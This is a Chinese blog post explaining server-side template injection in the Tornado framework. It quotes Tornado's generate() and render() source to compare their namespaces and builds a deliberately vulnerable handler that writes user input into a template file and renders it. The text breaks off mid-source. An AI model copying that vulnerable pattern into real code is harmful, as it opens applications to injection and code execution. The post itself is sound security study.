<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >
  <script type="module"> import mermaid from https://cdn.jsdelivr.net/npm/mermaid@11.12.1/+esm </script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Tornado SSTI" />
<meta name="author" content="lamaper" />
<meta property="og:locale" content="zh" />
<meta name="description" content="什么时候才能结束SSTI啊⊙﹏⊙" />
<meta property="og:description" content="什么时候才能结束SSTI啊⊙﹏⊙" />
<link rel="canonical" href="/posts/tornado-ssti/" />
<meta property="og:url" content="/posts/tornado-ssti/" />
<meta property="og:site_name" content="lamaper" />
<meta property="og:image" content="https://tornado.org.cn/en/stable/_images/tornado.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-11-19T20:16:21+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://tornado.org.cn/en/stable/_images/tornado.png" />
<meta property="twitter:title" content="Tornado SSTI" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lamaper","url":"https://github.com/lamaper/"},"dateModified":"2025-11-19T20:16:21+08:00","datePublished":"2025-11-19T20:16:21+08:00","description":"什么时候才能结束SSTI啊⊙﹏⊙","headline":"Tornado SSTI","image":"https://tornado.org.cn/en/stable/_images/tornado.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/tornado-ssti/"},"url":"/posts/tornado-ssti/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Tornado SSTI | lamaper
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">



  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js,npm/mermaid@11.12.0/dist/mermaid.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script src="/assets/js/data/mathjax.js"></script>
  <script async src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>


<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="https://avatars.githubusercontent.com/u/108182318?v=4" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">lamaper</a>
    <p class="site-subtitle fst-italic mb-0">Web / CTF / Coding</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    

      
        <a
          href="https://github.com/lamaper"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="javascript:location.href = 'mailto:' + ['lamaper','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Tornado SSTI</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Tornado SSTI</h1>
    
      <p class="post-desc fw-light mb-4">什么时候才能结束SSTI啊⊙﹏⊙</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1763554581"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Nov 19, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="https://tornado.org.cn/en/stable/_images/tornado.png" class="popup img-link preview-img shimmer"><img src="https://tornado.org.cn/en/stable/_images/tornado.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/lamaper/">lamaper</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2856 words"
>
  <em>15 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Tornado SSTI</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Tornado SSTI</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    
<h2 id="tornado-ssti"><span class="me-2">Tornado SSTI</span><a href="#tornado-ssti" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Tornado 是一个 Python Web 框架和异步网络库，最初由 FriendFeed 开发。通过使用非阻塞网络 I/O，Tornado 可以扩展到数万个开放连接，使其成为 长轮询、WebSocket 和其他需要与每个用户保持长期连接的应用程序的理想选择。</p>

<p>Tornado 可以粗略地分为三个主要部分</p>

<ul>
  <li>
    <p>一个 Web 框架（包括 RequestHandler，它被子类化以创建 Web 应用程序，以及各种支持类）。</p>
  </li>
  <li>
    <p>HTTP 的客户端和服务器端实现 (HTTPServer 和 AsyncHTTPClient）。</p>
  </li>
  <li>
    <p>一个异步网络库，包括类 IOLoop 和 IOStream，它们作为 HTTP 组件的构建块，也可以用于实现其他协议。</p>
  </li>
</ul>

<p>Tornado Web 框架和 HTTP 服务器共同提供了一个完整的堆栈替代方案，替代了 WSGI。</p>

<p>在Tornado官网上可以查看我们关心的模板引擎部分：</p>

<h3 id="render和generate"><span class="me-2">render()和generate()</span><a href="#render和generate" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="generate"><span class="me-2">generate()</span><a href="#generate" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p><a href="https://tornado.org.cn/en/stable/template.html">tornado.template — 灵活的输出生成 — Tornado 6.4.1 文档 - Tornado 服务器</a></p>

<p>安装官网的步骤，构建模板渲染可以有：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">t</span> <span class="o">=</span> <span class="n">template</span><span class="p">.</span><span class="nc">Template</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;html&gt;{{ myvalue }}&lt;/html&gt;</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">t</span><span class="p">.</span><span class="nf">generate</span><span class="p">(</span><span class="n">myvalue</span><span class="o">=</span><span class="sh">"</span><span class="s">XXX</span><span class="sh">"</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>显然这个过程没有SSTI，因为模板内容可控。如果要产生不安全的模板渲染，可以有如下写法：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">template_str</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">&lt;h1&gt;Hello, </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s">!&lt;/h1&gt;</span><span class="sh">"</span>
<span class="n">template</span> <span class="o">=</span> <span class="nc">Template</span><span class="p">(</span><span class="n">template_str</span><span class="p">)</span>
<span class="n">rendered</span> <span class="o">=</span> <span class="n">template</span><span class="p">.</span><span class="nf">generate</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>由于使用了f格式化字符串，这里的模板变成了不可控的，如果用户输入模板语法，网站就会自动解析。</p>

<h4 id="render"><span class="me-2">render()</span><a href="#render" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>与上面显著不同地是<a href="https://tornado.org.cn/en/stable/web.html#tornado.web.RequestHandler.render">tornado.web — RequestHandler.render — Tornado 6.4.1 文档 - Tornado 服务器</a></p>

<p>构造一个漏洞环境：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1"># /render：把用户输入写到 1.html，然后用 self.render 渲染
</span><span class="k">class</span> <span class="nc">RenderHandler</span><span class="p">(</span><span class="n">tornado</span><span class="p">.</span><span class="n">web</span><span class="p">.</span><span class="n">RequestHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">get_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">ssti</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">{{ 7 * 7 }}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">BASE_DIR</span><span class="p">,</span> <span class="sh">"</span><span class="s">1.html</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="sh">"</span><span class="s">1.html</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="区别"><span class="me-2">区别</span><a href="#区别" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>二者的显著区别在于<strong>全局环境</strong>不同。</p>

<p><code class="language-plaintext highlighter-rouge">generate()</code>方法基于./tornado/template.py中的<code class="language-plaintext highlighter-rouge">Template</code>类：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">Template</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">A compiled template.

    We compile into Python from the given template_string. You can generate
    the template from variables with generate().
    </span><span class="sh">"""</span>
</pre></td></tr></tbody></table></code></div></div>

<p>它直接继承于object，<code class="language-plaintext highlighter-rouge">generate()</code>源码实现如下：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>    <span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">:</span> <span class="n">Any</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
        <span class="sh">"""</span><span class="s">Generate this template with the given arguments.</span><span class="sh">"""</span>
        <span class="n">namespace</span> <span class="o">=</span> <span class="p">{</span>
            <span class="sh">"</span><span class="s">escape</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">xhtml_escape</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">xhtml_escape</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">xhtml_escape</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">url_escape</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">url_escape</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">json_encode</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">json_encode</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">squeeze</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">squeeze</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">linkify</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">linkify</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">datetime</span><span class="sh">"</span><span class="p">:</span> <span class="n">datetime</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">_tt_utf8</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">utf8</span><span class="p">,</span>  <span class="c1"># for internal use
</span>            <span class="sh">"</span><span class="s">_tt_string_types</span><span class="sh">"</span><span class="p">:</span> <span class="p">(</span><span class="n">unicode_type</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">),</span>
            <span class="c1"># __name__ and __loader__ allow the traceback mechanism to find
</span>            <span class="c1"># the generated source code.
</span>            <span class="sh">"</span><span class="s">__name__</span><span class="sh">"</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">_</span><span class="sh">"</span><span class="p">),</span>
            <span class="sh">"</span><span class="s">__loader__</span><span class="sh">"</span><span class="p">:</span> <span class="nc">ObjectDict</span><span class="p">(</span><span class="n">get_source</span><span class="o">=</span><span class="k">lambda</span> <span class="n">name</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">code</span><span class="p">),</span>
        <span class="p">}</span>
        <span class="n">namespace</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">namespace</span><span class="p">)</span>
        <span class="n">namespace</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="nf">exec_in</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">compiled</span><span class="p">,</span> <span class="n">namespace</span><span class="p">)</span>
        <span class="n">execute</span> <span class="o">=</span> <span class="n">typing</span><span class="p">.</span><span class="nf">cast</span><span class="p">(</span><span class="n">Callable</span><span class="p">[[],</span> <span class="nb">bytes</span><span class="p">],</span> <span class="n">namespace</span><span class="p">[</span><span class="sh">"</span><span class="s">_tt_execute</span><span class="sh">"</span><span class="p">])</span>
        <span class="c1"># Clear the traceback module's cache of source data now that
</span>        <span class="c1"># we've generated a new template (mainly for this module's
</span>        <span class="c1"># unittests, where different tests reuse the same name).
</span>        <span class="n">linecache</span><span class="p">.</span><span class="nf">clearcache</span><span class="p">()</span>
        <span class="k">return</span> <span class="nf">execute</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>我们可以清晰地看到这里的全局有哪些。</p>

<p>反观<code class="language-plaintext highlighter-rouge">render()</code>，这个方法来源于./tornado/web.py的<code class="language-plaintext highlighter-rouge">RequestHandler</code>类：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Base class for HTTP request handlers.

    Subclasses must define at least one of the methods defined in the
    </span><span class="sh">"</span><span class="s">Entry points</span><span class="sh">"</span><span class="s"> section below.

    Applications should not construct `RequestHandler` objects
    directly and subclasses should not override ``__init__`` (override
    `~RequestHandler.initialize` instead).

    </span><span class="sh">"""</span>
</pre></td></tr></tbody></table></code></div></div>

<p>同样直接继承自<code class="language-plaintext highlighter-rouge">object</code>，这意味着两种类没有直接关联。<code class="language-plaintext highlighter-rouge">render()</code>函数基于<code class="language-plaintext highlighter-rouge">render_string()</code>：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>    <span class="k">def</span> <span class="nf">render</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">template_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">:</span> <span class="n">Any</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="sh">"</span><span class="s">Future[None]</span><span class="sh">"</span><span class="p">:</span>
        <span class="sh">"""</span><span class="s">Renders the template with the given arguments as the response.

        ``render()`` calls ``finish()``, so no other output methods can be called
        after it.

        Returns a `.Future` with the same semantics as the one returned by `finish`.
        Awaiting this `.Future` is optional.

        .. versionchanged:: 5.1

           Now returns a `.Future` instead of ``None``.
        </span><span class="sh">"""</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">_finished</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nc">RuntimeError</span><span class="p">(</span><span class="sh">"</span><span class="s">Cannot render() after finish()</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">html</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">render_string</span><span class="p">(</span><span class="n">template_name</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="p">...</span><span class="bp">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>而<code class="language-plaintext highlighter-rouge">render_string()</code>显式地调用了<code class="language-plaintext highlighter-rouge">generate()</code>，并自行定义了<code class="language-plaintext highlighter-rouge">namespace</code>传入其中：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>    <span class="k">def</span> <span class="nf">render_string</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">template_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">:</span> <span class="n">Any</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
        <span class="sh">"""</span><span class="s">Generate the given template with the given arguments.

        We return the generated byte string (in utf8). To generate and
        write a template as a response, use render() above.
        </span><span class="sh">"""</span>
        <span class="c1"># If no template_path is specified, use the path of the calling file
</span>        <span class="n">template_path</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">get_template_path</span><span class="p">()</span>
        <span class="p">...</span><span class="bp">...</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">loader</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="n">template_name</span><span class="p">)</span>
        <span class="n">namespace</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">get_template_namespace</span><span class="p">()</span>
        <span class="n">namespace</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">t</span><span class="p">.</span><span class="nf">generate</span><span class="p">(</span><span class="o">**</span><span class="n">namespace</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>这里的<code class="language-plaintext highlighter-rouge">namespace</code>来自于<code class="language-plaintext highlighter-rouge">RequestHandler</code>直接定义的一个字典，由<code class="language-plaintext highlighter-rouge">get_template_namespace()</code>返回：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>    <span class="k">def</span> <span class="nf">get_template_namespace</span><span class="p">(</span><span class="n">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]:</span>
        <span class="sh">"""</span><span class="s">Returns a dictionary to be used as the default template namespace.

        May be overridden by subclasses to add or modify values.

        The results of this method will be combined with additional
        defaults in the `tornado.template` module and keyword arguments
